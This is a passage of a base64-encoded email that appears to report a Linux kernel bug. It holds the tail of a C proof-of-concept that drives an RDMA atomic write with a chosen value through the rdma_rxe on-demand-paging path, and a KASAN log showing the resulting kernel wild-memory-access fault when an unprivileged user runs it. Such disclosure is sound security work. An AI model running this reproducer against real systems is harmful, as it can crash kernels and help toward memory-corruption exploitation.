dl9xcF90b19xcF9leChxcDApOwogICAgaWYgKCFxcHgpIHsKICAgICAgICBmcHJpbnRmKHN0ZGVy
ciwgImlidl9xcF90b19xcF9leCBmYWlsZWRcbiIpOwogICAgICAgIHJldHVybiBFWElUX0ZBSUxV
UkU7CiAgICB9CgogICAgcXB4LT53cl9pZCA9IDB4NDE0MTQxNDE7CiAgICBxcHgtPndyX2ZsYWdz
ID0gSUJWX1NFTkRfU0lHTkFMRUQ7CgogICAgaWJ2X3dyX3N0YXJ0KHFweCk7CgogICAgaWJ2X3dy
X2F0b21pY193cml0ZSgKICAgICAgICBxcHgsCiAgICAgICAgbXItPnJrZXksCiAgICAgICAgaW92
YSwKICAgICAgICAmdmFsdWUpOwoKICAgIHJldCA9IGlidl93cl9jb21wbGV0ZShxcHgpOwoKICAg
IHByaW50ZigiaWJ2X3dyX2NvbXBsZXRlOiAlZFxuIiwgcmV0KTsKCiAgICBpZiAocmV0KSB7CiAg
ICAgICAgZXJybm8gPSByZXQ7CiAgICAgICAgcGVycm9yKCJpYnZfd3JfY29tcGxldGUiKTsKICAg
IH0KCiAgICBwcmludGYoImF0b21pYyB3cml0ZSByZW1vdGVfYWRkcj0weCUiIFBSSXg2NCAiXG4i
LCBpb3ZhKTsKICAgIHByaW50ZigiYXRvbWljIHdyaXRlIHJrZXk9MHgleFxuIiwgbXItPnJrZXkp
OwogICAgcHJpbnRmKCJhdG9taWMgdmFsdWU9MHglIiBQUkl4NjQgIlxuIiwgdmFsdWUpOwogICAg
cHJpbnRmKCJ0cmlnZ2VyaW5nIE9EUCBhdG9taWMtd3JpdGUgcGF0aC4uLlxuIik7CgogICAgcG9s
bF9jcV90aW1lb3V0KGNxMCwgNTAwMCk7CgogICAgcHJpbnRmKCJ2ZXJpZmljYXRpb24gZmluaXNo
ZWRcbiIpOwoKICAgIGlidl9kZXJlZ19tcihtcik7CiAgICBmcmVlKGJ1Zik7CiAgICBpYnZfZGVz
dHJveV9xcChxcDEpOwogICAgaWJ2X2Rlc3Ryb3lfcXAocXAwKTsKICAgIGlidl9kZXN0cm95X2Nx
KGNxMSk7CiAgICBpYnZfZGVzdHJveV9jcShjcTApOwogICAgaWJ2X2RlYWxsb2NfcGQocGQpOwog
ICAgaWJ2X2Nsb3NlX2RldmljZShjdHgpOwoKICAgIHJldHVybiAwOwp9Cg==

--_005_SY7P300MB0292E9E08F0890A2C31CFD96DE972SY7P300MB0292AUSP_
Content-Type: text/plain; name="kasan-oops.txt"
Content-Description: kasan-oops.txt
Content-Disposition: attachment; filename="kasan-oops.txt"; size=13231;
	creation-date="Sun, 04 Oct 2026 14:02:58 GMT";
	modification-date="Sun, 04 Oct 2026 14:04:03 GMT"
Content-Transfer-Encoding: base64

Z2NjIC1PMCAtZyAtV2FsbCAtV2V4dHJhIC1vIHBvYyBwb2MuYyAtbGlidmVyYnMNCg0K4pSU4pSA
JCBzdSAtIHBvY3VzZXIgLWMgL3RtcC9wb2MNCuWvhuegge+8miANCmRldmljZTogcnhlMA0KR0lE
WzFdOiA6OmZmZmY6MTI3LjAuMC4xDQp1c2VyIFZBICAgICAgOiAweDU1YjBmNGZiMjAwMA0KT0RQ
IElPVkEgICAgIDogMHg1NWIxZjRmYjIwMDANCklPVkEgZGVsdGEgICA6IDB4MTAwMDAwMDAwDQpP
RFAgbGtleSAgICAgOiAweDc1NA0KT0RQIHJrZXkgICAgIDogMHg3NTQNCk9EUCBsZW5ndGggICA6
IDB4MTAwMA0KZXhwZWN0ZWQgaWR4IDogMHgxMDAwMDANCmlidl93cl9jb21wbGV0ZTogMA0KYXRv
bWljIHdyaXRlIHJlbW90ZV9hZGRyPTB4NTViMWY0ZmIyMDAwDQphdG9taWMgd3JpdGUgcmtleT0w
eDc1NA0KYXRvbWljIHZhbHVlPTB4NDE0MTQxNDE0MjQyNDI0Mg0KdHJpZ2dlcmluZyBPRFAgYXRv
bWljLXdyaXRlIHBhdGguLi4NCkNRIHRpbWVvdXQgYWZ0ZXIgNTAwMCBtcw0KdmVyaWZpY2F0aW9u
IGZpbmlzaGVkDQoNCuKUlOKUgCQgZG1lc2cgLVQgfCB0YWlsIC0yNTANClvml6UgMTDmnIggIDQg
MjE6MzE6NDcgMjAyNl0gT29wczogZ2VuZXJhbCBwcm90ZWN0aW9uIGZhdWx0LCBwcm9iYWJseSBm
b3Igbm9uLWNhbm9uaWNhbCBhZGRyZXNzIDB4Zjk5OTg2YTk5OTk5OTgwMDogMDAwMCBbIzNdIFNN
UCBLQVNBTiBQVEkNClvml6UgMTDmnIggIDQgMjE6MzE6NDcgMjAyNl0gS0FTQU46IG1heWJlIHdp
bGQtbWVtb3J5LWFjY2VzcyBpbiByYW5nZSBbMHhjY2NjNTU0Y2NjY2NjMDAwLTB4Y2NjYzU1NGNj
Y2NjYzAwN10NClvml6UgMTDmnIggIDQgMjE6MzE6NDcgMjAyNl0gQ1BVOiAzIFVJRDogMCBQSUQ6
IDEzNDk1IENvbW06IGt3b3JrZXIvdTUxNDoxIFRhaW50ZWQ6IEcgICAgQiBEIFcgICAgICAgICAg
IDcuMi44ICMyIFBSRUVNUFQobGF6eSkgDQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdIFRh
aW50ZWQ6IFtCXT1CQURfUEFHRSwgW0RdPURJRSwgW1ddPVdBUk4NClvml6UgMTDmnIggIDQgMjE6
MzE6NDcgMjAyNl0gSGFyZHdhcmUgbmFtZTogVk13YXJlLCBJbmMuIFZNd2FyZSBWaXJ0dWFsIFBs
YXRmb3JtLzQ0MEJYIERlc2t0b3AgUmVmZXJlbmNlIFBsYXRmb3JtLCBCSU9TIDYuMDAgMTEvMTIv
MjAyMA0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2XSBXb3JrcXVldWU6IHJ4ZV93cSBkb193
b3JrIFtyZG1hX3J4ZV0NClvml6UgMTDmnIggIDQgMjE6MzE6NDcgMjAyNl0gUklQOiAwMDEwOnJ4
ZV9vZHBfZG9fYXRvbWljX3dyaXRlKzB4MWJhLzB4M2UwIFtyZG1hX3J4ZV0NClvml6UgMTDmnIgg
IDQgMjE6MzE6NDcgMjAyNl0gQ29kZTogMDEgMDAgMDAgNDggMDMgMDUgOWUgZjIgOTYgYzMgNDEg
YzEgZTggMDMgNDIgOGQgMTQgYzUgMDAgMDAgMDAgMDAgNDggMDEgZDAgNDggYmEgMDAgMDAgMDAg
MDAgMDAgZmMgZmYgZGYgNDggODkgYzEgNDggYzEgZTkgMDMgPDgwPiAzYyAxMSAwMCAwZiA4NSBi
NSAwMSAwMCAwMCA0OCA4OSAxOCA0OCA4ZCBiZCBlMCAwMCAwMCAwMCBlOCBjZA0KW+aXpSAxMOac
iCAgNCAyMTozMTo0NyAyMDI2XSBSU1A6IDAwMTg6ZmZmZmM5MDAxNWQxZmEzOCBFRkxBR1M6IDAw
MDEwYTA2DQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdIFJBWDogY2NjYzU1NGNjY2NjYzAw
MCBSQlg6IDQxNDE0MTQxNDI0MjQyNDIgUkNYOiAxOTk5OGFhOTk5OTk5ODAwDQpb5pelIDEw5pyI
ICA0IDIxOjMxOjQ3IDIwMjZdIFJEWDogZGZmZmZjMDAwMDAwMDAwMCBSU0k6IDAwMDAwMDAwMDAw
MDAwMDggUkRJOiBmZmZmYzkwMDE1ZDFmYTA4DQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZd
IFJCUDogZmZmZjg4ODEyZjI5YTAwMCBSMDg6IDAwMDAwMDAwMDAwMDAwMDAgUjA5OiBmZmZmODg4
MTJmMjlhMTA4DQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdIFIxMDogMDAwMDAwMDAwMDAw
MDAwOCBSMTE6IDAwMDA1NWIxZjRmYjMwMDAgUjEyOiBmZmZmODg4MTA3OTg0OTk4DQpb5pelIDEw
5pyIICA0IDIxOjMxOjQ3IDIwMjZdIFIxMzogZmZmZjg4ODEyZjI5OTQwMCBSMTQ6IGZmZmY4ODgx
MDZjMTM4MDAgUjE1OiA0MTQxNDE0MTQyNDI0MjQyDQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIw
MjZdIEZTOiAgMDAwMDAwMDAwMDAwMDAwMCgwMDAwKSBHUzpmZmZmODg4MjY1YTFkMDAwKDAwMDAp
IGtubEdTOjAwMDAwMDAwMDAwMDAwMDANClvml6UgMTDmnIggIDQgMjE6MzE6NDcgMjAyNl0gQ1M6
ICAwMDEwIERTOiAwMDAwIEVTOiAwMDAwIENSMDogMDAwMDAwMDA4MDA1MDAzMw0KW+aXpSAxMOac
iCAgNCAyMTozMTo0NyAyMDI2XSBDUjI6IDAwMDA3ZmYwMTVjMDQ0MWMgQ1IzOiAwMDAwMDAwMTJi
ZDk2MDA0IENSNDogMDAwMDAwMDAwMDM3MGVmMA0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2
XSBDYWxsIFRyYWNlOg0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2XSAgPFRBU0s+DQpb5pel
IDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdICByeGVfcmVjZWl2ZXIrMHgyNmYyLzB4YTAwMCBbcmRt
YV9yeGVdDQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdICA/IF9fcGZ4X3J4ZV9yZWNlaXZl
cisweDEwLzB4MTAgW3JkbWFfcnhlXQ0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2XSAgPyBf
X3dha2VfdXArMHg0NC8weDYwDQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdICA/IF9fcGZ4
X3J4ZV9jb21wbGV0ZXIrMHgxMC8weDEwIFtyZG1hX3J4ZV0NClvml6UgMTDmnIggIDQgMjE6MzE6
NDcgMjAyNl0gID8gbl90dHlfcmVjZWl2ZV9idWZfY29tbW9uKzB4ODlkLzB4MTcwMA0KW+aXpSAx
MOaciCAgNCAyMTozMTo0NyAyMDI2XSAgPyBfX3BmeF9yeGVfcmVxdWVzdGVyKzB4MTAvMHgxMCBb
cmRtYV9yeGVdDQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdICA/IF9yYXdfc3Bpbl9sb2Nr
X2lycXNhdmUrMHg5NC8weGYwDQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdICA/IF9fcGZ4
X19yYXdfc3Bpbl9sb2NrX2lycXNhdmUrMHgxMC8weDEwDQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3
IDIwMjZdICA/IF9fYXNhbl9tZW1zZXQrMHgyNy8weDUwDQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3
IDIwMjZdICA/IF9fcGZ4X3J4ZV9yZWNlaXZlcisweDEwLzB4MTAgW3JkbWFfcnhlXQ0KW+aXpSAx
MOaciCAgNCAyMTozMTo0NyAyMDI2XSAgZG9fd29yaysweDE0OS8weDYxMCBbcmRtYV9yeGVdDQpb
5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdICBwcm9jZXNzX29uZV93b3JrKzB4NmFhLzB4ZmEw
DQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdICA/IGFzc2lnbl93b3JrKzB4MTI5LzB4NWEw
DQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdICB3b3JrZXJfdGhyZWFkKzB4NGVhLzB4ZDUw
DQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdICA/IF9fa3RocmVhZF9wYXJrbWUrMHg4ZC8w
eDE3MA0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2XSAgPyBfX3BmeF93b3JrZXJfdGhyZWFk
KzB4MTAvMHgxMA0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2XSAgPyBfX3BmeF93b3JrZXJf
dGhyZWFkKzB4MTAvMHgxMA0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2XSAga3RocmVhZCsw
eDMyNy8weDQxMA0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2XSAgPyByZWNhbGNfc2lncGVu
ZGluZysweDE1Yy8weDIwMA0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2XSAgPyBfX3BmeF9r
dGhyZWFkKzB4MTAvMHgxMA0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2XSAgcmV0X2Zyb21f
Zm9yaysweDRkNS8weDc2MA0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2XSAgPyBfX3BmeF9y
ZXRfZnJvbV9mb3JrKzB4MTAvMHgxMA0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2XSAgPyBf
X3N3aXRjaF90bysweDNhYi8weGQwMA0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2XSAgPyBf
X3N3aXRjaF90b19hc20rMHgzOS8weDcwDQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdICA/
IF9fc3dpdGNoX3RvX2FzbSsweDMzLzB4NzANClvml6UgMTDmnIggIDQgMjE6MzE6NDcgMjAyNl0g
ID8gX19wZnhfa3RocmVhZCsweDEwLzB4MTANClvml6UgMTDmnIggIDQgMjE6MzE6NDcgMjAyNl0g
IHJldF9mcm9tX2ZvcmtfYXNtKzB4MWEvMHgzMA0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2
XSAgPC9UQVNLPg0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2XSBNb2R1bGVzIGxpbmtlZCBp
bjogbXB0Y3BfZGlhZyB4c2tfZGlhZyB2c29ja19kaWFnIHRjcF9kaWFnIHVkcF9kaWFnIHJhd19k
aWFnIGluZXRfZGlhZyB1bml4X2RpYWcgYWZfcGFja2V0X2RpYWcgbmV0bGlua19kaWFnIHJwY3Jk
bWEgcmRtYV91Y20gaWJfdXZlcmJzIGliX3V2ZXJic19zdXBwb3J0IGliX2lzZXIgcmRtYV9jbSBp
d19jbSBpYl9jbSBsaWJpc2NzaSBzY3NpX3RyYW5zcG9ydF9pc2NzaSByZG1hX3J4ZSBpcDZfdWRw
X3R1bm5lbCB1ZHBfdHVubmVsIGliX2NvcmUgeHRfbmF0IHh0X3RjcHVkcCBuZl9jb25udHJhY2tf
bmV0bGluayB2ZXRoIHNuZF9zZXFfZHVtbXkgc25kX3NlcV9taWRpIHNuZF9ocnRpbWVyIHNuZF9z
ZXFfbWlkaV9ldmVudCBzbmRfc2VxIHh0X2Nvbm50cmFjayBuZnRfY2hhaW5fbmF0IHh0X01BU1FV
RVJBREUgbmZfbmF0IG5mX2Nvbm50cmFjayBuZl9kZWZyYWdfaXB2NiBuZl9kZWZyYWdfaXB2NCBi
cmlkZ2Ugc3RwIGxsYyB4ZnJtX3VzZXIgeGZybV9hbGdvIHh0X2FkZHJ0eXBlIG5mdF9jb21wYXQg
eF90YWJsZXMgbmZfdGFibGVzIG92ZXJsYXkgaW50ZWxfcmFwbF9tc3IgaW50ZWxfcmFwbF9jb21t
b24gaW50ZWxfdW5jb3JlX2ZyZXF1ZW5jeV9jb21tb24gaW50ZWxfcG1jX2NvcmUgcG10X3RlbGVt
ZXRyeSBwbXRfZGlzY292ZXJ5IHBtdF9jbGFzcyBpbnRlbF9wbWNfc3NyYW1fdGVsZW1ldHJ5IGlu
dGVsX3BtY19wd3JtX3RlbGVtZXRyeSBpbnRlbF92c2VjIHJhcGwgdm13X2JhbGxvb24gcmZraWxs
IHFydHIgcGNzcGtyIHNuZF9lbnMxMzcxIHNuZF9hYzk3X2NvZGVjIGFjOTdfYnVzIGdhbWVwb3J0
IHNuZF9yYXdtaWRpIHNuZF9zZXFfZGV2aWNlIHNuZF9wY20gc25kX3RpbWVyIHNuZCBzb3VuZGNv
cmUgc3VucnBjIGJpbmZtdF9taXNjIGFjIGpveWRldiBzZyBldmRldiB0bHMgY29uZmlnZnMgZWZp
X3BzdG9yZSB2c29ja19sb29wYmFjayB2bXdfdnNvY2tfdmlydGlvX3RyYW5zcG9ydF9jb21tb24g
dm13X3Zzb2NrX3ZtY2lfdHJhbnNwb3J0IHZzb2NrDQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIw
MjZdICB2bXdfdm1jaSBhdXRvZnM0IGV4dDQgY3JjMTYgbWJjYWNoZSBqYmQyIGhpZF9nZW5lcmlj
IHVzYmhpZCBoaWQgdm13Z2Z4IGRybV90dG1faGVscGVyIHR0bSBkcm1fY2xpZW50X2xpYiBzcl9t
b2QgZHJtX2ttc19oZWxwZXIgY2Ryb20gdWhjaV9oY2Qgc2RfbW9kIGF0YV9nZW5lcmljIGVoY2lf
cGNpIGRybSBwc21vdXNlIGVoY2lfaGNkIG1wdHNwaSB1c2Jjb3JlIGF0YV9waWl4IG1wdHNjc2lo
IGFlc25pX2ludGVsIG1wdGJhc2UgZ2YxMjhtdWwgbGliYXRhIHNlcmlvX3JhdyBlMTAwMCBzY3Np
X3RyYW5zcG9ydF9zcGkgdXNiX2NvbW1vbiBpMmNfcGlpeDQgc2NzaV9tb2QgaTJjX3NtYnVzIHNj
c2lfY29tbW9uIGJ1dHRvbg0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2XSAtLS1bIGVuZCB0
cmFjZSAwMDAwMDAwMDAwMDAwMDAwIF0tLS0NClvml6UgMTDmnIggIDQgMjE6MzE6NDcgMjAyNl0g
UklQOiAwMDEwOnJ4ZV9vZHBfZG9fYXRvbWljX3dyaXRlKzB4MWJhLzB4M2UwIFtyZG1hX3J4ZV0N
Clvml6UgMTDmnIggIDQgMjE6MzE6NDcgMjAyNl0gQ29kZTogMDEgMDAgMDAgNDggMDMgMDUgOWUg
ZjIgOTYgYzMgNDEgYzEgZTggMDMgNDIgOGQgMTQgYzUgMDAgMDAgMDAgMDAgNDggMDEgZDAgNDgg
YmEgMDAgMDAgMDAgMDAgMDAgZmMgZmYgZGYgNDggODkgYzEgNDggYzEgZTkgMDMgPDgwPiAzYyAx
MSAwMCAwZiA4NSBiNSAwMSAwMCAwMCA0OCA4OSAxOCA0OCA4ZCBiZCBlMCAwMCAwMCAwMCBlOCBj
ZA0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2XSBSU1A6IDAwMTg6ZmZmZmM5MDAwMGFmZmEz
OCBFRkxBR1M6IDAwMDEwYTA2DQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdIFJBWDogY2Nj
YzU1NGNjY2NjYzAwMCBSQlg6IDQxNDE0MTQxNDI0MjQyNDIgUkNYOiAxOTk5OGFhOTk5OTk5ODAw
DQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdIFJEWDogZGZmZmZjMDAwMDAwMDAwMCBSU0k6
IDAwMDAwMDAwMDAwMDAwMDggUkRJOiBmZmZmYzkwMDAwYWZmYTA4DQpb5pelIDEw5pyIICA0IDIx
OjMxOjQ3IDIwMjZdIFJCUDogZmZmZjg4ODEzYmI4NTAwMCBSMDg6IDAwMDAwMDAwMDAwMDAwMDAg
UjA5OiBmZmZmODg4MTNiYjg1MTA4DQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdIFIxMDog
MDAwMDAwMDAwMDAwMDAwOCBSMTE6IDAwMDA1NWQ0OGJkNDAwMDAgUjEyOiBmZmZmODg4MTA2Nzhj
ZWE4DQpb5pelIDEw5pyIICA0IDIxOjMxOjQ3IDIwMjZdIFIxMzogZmZmZjg4ODEzYmI4MGUwMCBS
MTQ6IGZmZmY4ODgxMDdhM2I4MDAgUjE1OiA0MTQxNDE0MTQyNDI0MjQyDQpb5pelIDEw5pyIICA0
IDIxOjMxOjQ3IDIwMjZdIEZTOiAgMDAwMDAwMDAwMDAwMDAwMCgwMDAwKSBHUzpmZmZmODg4MjY1
YTFkMDAwKDAwMDApIGtubEdTOjAwMDAwMDAwMDAwMDAwMDANClvml6UgMTDmnIggIDQgMjE6MzE6
NDcgMjAyNl0gQ1M6ICAwMDEwIERTOiAwMDAwIEVTOiAwMDAwIENSMDogMDAwMDAwMDA4MDA1MDAz
Mw0KW+aXpSAxMOaciCAgNCAyMTozMTo0NyAyMDI2XSBDUjI6IDAwMDA3ZmYwMTVjMDQ0MWMgQ1Iz
OiAwMDAwMDAwMTJiZDk2MDA0IENSNDogMDAwMDAwMDAwMDM3MGVmMA0KW+aXpSAxMOaciCAgNCAy
MTozMjo0NCAyMDI2XSAtLS0tLS0tLS0tLS1bIGN1dCBoZXJlIF0tLS0tLS0tLS0tLS0NClvml6Ug
MTDmnIggIDQgMjE6MzI6NDQgMjAyNl0gV0FSTklORzogZHJpdmVycy9pbmZpbmliYW5kL3N3L3J4
ZS9yeGVfcG9vbC5jOjIxMiBhdCBfX3J4ZV9jbGVhbnVwKzB4MjIyLzB4MmEwIFtyZG1hX3J4ZV0s
IENQVSMzOiBwb2MvMTM2MDkNClvml6UgMTDmnIggIDQgMjE6MzI6NDQgMjAyNl0gTW9kdWxlcyBs
aW5rZWQgaW46IG1wdGNwX2RpYWcgeHNrX2RpYWcgdnNvY2tfZGlhZyB0Y3BfZGlhZyB1ZHBfZGlh
ZyByYXdfZGlhZyBpbmV0X2RpYWcgdW5peF9kaWFnIGFmX3BhY2tldF9kaWFnIG5ldGxpbmtfZGlh
ZyBycGNyZG1hIHJkbWFfdWNtIGliX3V2ZXJicyBpYl91dmVyYnNfc3VwcG9ydCBpYl9pc2VyIHJk
bWFfY20gaXdfY20gaWJfY20gbGliaXNjc2kgc2NzaV90cmFuc3BvcnRfaXNjc2kgcmRtYV9yeGUg
aXA2X3VkcF90dW5uZWwgdWRwX3R1bm5lbCBpYl9jb3JlIHh0X25hdCB4dF90Y3B1ZHAgbmZfY29u
bnRyYWNrX25ldGxpbmsgdmV0aCBzbmRfc2VxX2R1bW15IHNuZF9zZXFfbWlkaSBzbmRfaHJ0aW1l
ciBzbmRfc2VxX21pZGlfZXZlbnQgc25kX3NlcSB4dF9jb25udHJhY2sgbmZ0X2NoYWluX25hdCB4
dF9NQVNRVUVSQURFIG5mX25hdCBuZl9jb25udHJhY2sgbmZfZGVmcmFnX2lwdjYgbmZfZGVmcmFn
X2lwdjQgYnJpZGdlIHN0cCBsbGMgeGZybV91c2VyIHhmcm1fYWxnbyB4dF9hZGRydHlwZSBuZnRf
Y29tcGF0IHhfdGFibGVzIG5mX3RhYmxlcyBvdmVybGF5IGludGVsX3JhcGxfbXNyIGludGVsX3Jh
cGxfY29tbW9uIGludGVsX3VuY29yZV9mcmVxdWVuY3lfY29tbW9uIGludGVsX3BtY19jb3JlIHBt
dF90ZWxlbWV0cnkgcG10X2Rpc2NvdmVyeSBwbXRfY2xhc3MgaW50ZWxfcG1jX3NzcmFtX3RlbGVt
ZXRyeSBpbnRlbF9wbWNfcHdybV90ZWxlbWV0cnkgaW50ZWxfdnNlYyByYXBsIHZtd19iYWxsb29u
IHJma2lsbCBxcnRyIHBjc3BrciBzbmRfZW5zMTM3MSBzbmRfYWM5N19jb2RlYyBhYzk3X2J1cyBn
YW1lcG9ydCBzbmRfcmF3bWlkaSBzbmRfc2VxX2RldmljZSBzbmRfcGNtIHNuZF90aW1lciBzbmQg
c291bmRjb3JlIHN1bnJwYyBiaW5mbXRfbWlzYyBhYyBqb3lkZXYgc2cgZXZkZXYgdGxzIGNvbmZp
Z2ZzIGVmaV9wc3RvcmUgdnNvY2tfbG9vcGJhY2sgdm13X3Zzb2NrX3ZpcnRpb190cmFuc3BvcnRf
Y29tbW9uIHZtd192c29ja192bWNpX3RyYW5zcG9ydCB2c29jaw0KW+aXpSAxMOaciCAgNCAyMToz
Mjo0NCAyMDI2XSAgdm13X3ZtY2kgYXV0b2ZzNCBleHQ0IGNyYzE2IG1iY2FjaGUgamJkMiBoaWRf
Z2VuZXJpYyB1c2JoaWQgaGlkIHZtd2dmeCBkcm1fdHRtX2hlbHBlciB0dG0gZHJtX2NsaWVudF9s
aWIgc3JfbW9kIGRybV9rbXNfaGVscGVyIGNkcm9tIHVoY2lfaGNkIHNkX21vZCBhdGFfZ2VuZXJp
YyBlaGNpX3BjaSBkcm0gcHNtb3VzZSBlaGNpX2hjZCBtcHRzcGkgdXNiY29yZSBhdGFfcGlpeCBt
cHRzY3NpaCBhZXNuaV9pbnRlbCBtcHRiYXNlIGdmMTI4bXVsIGxpYmF0YSBzZXJpb19yYXcgZTEw
MDAgc2NzaV90cmFuc3BvcnRfc3BpIHVzYl9jb21tb24gaTJjX3BpaXg0IHNjc2lfbW9kIGkyY19z
bWJ1cyBzY3NpX2NvbW1vbiBidXR0b24NClvml6UgMTDmnIggIDQgMjE6MzI6NDQgMjAyNl0gQ1BV
OiAzIFVJRDogMTAwMSBQSUQ6IDEzNjA5IENvbW06IHBvYyBUYWludGVkOiBHICAgIEIgRCBXICAg
ICAgICAgICA3LjIuOCAjMiBQUkVFTVBUKGxhenkpIA0KW+aXpSAxMOaciCAgNCAyMTozMjo0NCAy
MDI2XSBUYWludGVkOiBbQl09QkFEX1BBR0UsIFtEXT1ESUUsIFtXXT1XQVJODQpb5pelIDEw5pyI
ICA0IDIxOjMyOjQ0IDIwMjZdIEhhcmR3YXJlIG5hbWU6IFZNd2FyZSwgSW5jLiBWTXdhcmUgVmly
dHVhbCBQbGF0Zm9ybS80NDBCWCBEZXNrdG9wIFJlZmVyZW5jZSBQbGF0Zm9ybSwgQklPUyA2LjAw
IDExLzEyLzIwMjANClvml6UgMTDmnIggIDQgMjE6MzI6NDQgMjAyNl0gUklQOiAwMDEwOl9fcnhl
X2NsZWFudXArMHgyMjIvMHgyYTAgW3JkbWFfcnhlXQ0KW+aXpSAxMOaciCAgNCAyMTozMjo0NCAy
MDI2XSBDb2RlOiA4NCBmNyBmZSBmZiBmZiA0YyA4OSBlNyBlOCBjYiA4MCA1OCBjMCA4NCBjMCAw
ZiA4NSA2ZiBmZiBmZiBmZiBiZSBkNCAzMCAwMCAwMCA0YyA4OSBlNyBlOCAzNiBkMyBkMiBjMiA4
NSBjMCAwZiA4NSA1YSBmZiBmZiBmZiA8MGY+IDBiIGViIDBjIDJlIDJlIDJlIDMxIGMwIGU5IDQ1
IGZlIGZmIGZmIDBmIDBiIGJkIDkyIGZmIGZmIGZmIGU5DQpb5pelIDEw5pyIICA0IDIxOjMyOjQ0
IDIwMjZdIFJTUDogMDAxODpmZmZmYzkwMDE4YWNmNjA4IEVGTEFHUzogMDAwMTAyNDYNClvml6Ug
MTDmnIggIDQgMjE6MzI6NDQgMjAyNl0gUkFYOiAwMDAwMDAwMDAwMDAwMDAwIFJCWDogZmZmZjg4
ODEyZjI5OTQwMCBSQ1g6IDFmZmZmOTIwMDMxNTllYWENClvml6UgMTDmnIggIDQgMjE6MzI6NDQg
MjAyNl0gUkRYOiAxZmZmZjExMDI1ZTUzMjg1IFJTSTogMWZmZmY5MjAwMzE1OWViMCBSREk6IGZm
ZmY4ODgxMmYyOTk0MzANClvml6UgMTDmnIggIDQgMjE6MzI6NDQgMjAyNl0gUkJQOiAwMDAwMDAw
MDAwMDAwMDAxIFIwODogMWZmZmYxMTAyNWU1MzI4NyBSMDk6IDFmZmZmMTEwMjVlNTMyODgNClvm
l6UgMTDmnIggIDQgMjE6MzI6NDQgMjAyNl0gUjEwOiAwMDAwMDAwMDAwMDAwMDAzIFIxMTogMDAw
MDAwMDAwMDAwMDAwMCBSMTI6IGZmZmY4ODgxMmYyOTk0MjgNClvml6UgMTDmnIggIDQgMjE6MzI6
NDQgMjAyNl0gUjEzOiAwMDAwMDAwMDAwMDAwMDAwIFIxNDogZmZmZjg4ODE0MWFhMmYyOCBSMTU6
IDFmZmZmOTIwMDMxNTllYzENClvml6UgMTDmnIggIDQgMjE6MzI6NDQgMjAyNl0gRlM6ICAwMDAw
N2Y0Yjk3NmNkNTgwKDAwMDApIEdTOmZmZmY4ODgyNjVhMWQwMDAoMDAwMCkga25sR1M6MDAwMDAw
MDAwMDAwMDAwMA0KW+aXpSAxMOaciCAgNCAyMTozMjo0NCAyMDI2XSBDUzogIDAwMTAgRFM6IDAw
MDAgRVM6IDAwMDAgQ1IwOiAwMDAwMDAwMDgwMDUwMDMzDQpb5pelIDEw5pyIICA0IDIxOjMyOjQ0
IDIwMjZdIENSMjogMDAwMDdmNjI3ZmU4YjAwMCBDUjM6IDAwMDAwMDAxNTk3NjIwMDQgQ1I0OiAw
MDAwMDAwMDAwMzcwZWYwDQpb5pelIDEw5pyIICA0IDIxOjMyOjQ0IDIwMjZdIENhbGwgVHJhY2U6
DQpb5pelIDEw5pyIICA0IDIxOjMyOjQ0IDIwMjZdICA8VEFTSz4NClvml6UgMTDmnIggIDQgMjE6
MzI6NDQgMjAyNl0gID8gX19wZnhfX19yeGVfY2xlYW51cCsweDEwLzB4MTAgW3JkbWFfcnhlXQ0K
W+aXpSAxMOaciCAgNCAyMTozMjo0NCAyMDI2XSAgcnhlX2RlcmVnX21yKzB4NmIvMHgxNjAgW3Jk
bWFfcnhlXQ0KW+aXpSAxMOaciCAgNCAyMTozMjo0NCAyMDI2XSAgaWJfZGVyZWdfbXJfdXNlcisw
eDEwOS8weDJkMCBbaWJfY29yZV0NClvml6UgMTDmnIggIDQgMjE6MzI6NDQgMjAyNl0gIGRlc3Ry
b3lfaHdfaWRyX3VvYmplY3QrMHg3ZS8weDE2MCBbaWJfdXZlcmJzX3N1cHBvcnRdDQpb5pelIDEw
5pyIICA0IDIxOjMyOjQ0IDIwMjZdICB1dmVyYnNfZGVzdHJveV91b2JqZWN0KzB4ZTIvMHg3NzAg
